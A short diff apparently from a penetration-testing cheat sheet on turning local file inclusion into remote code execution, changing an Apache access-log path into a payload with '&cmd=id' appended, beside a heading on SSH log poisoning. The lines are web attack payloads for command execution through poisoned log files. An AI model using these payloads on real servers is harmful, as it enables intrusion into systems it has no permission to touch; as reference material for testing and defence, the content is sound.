@@ -125,7 +125,7 @@ RCE
 /var/log/httpd-access.log&cmd=id
 ```
 ```
-/var/log/apache2/access.log
+/var/log/apache2/access.log&cmd=id
 ```
 #### SSH Log Poisoning
 
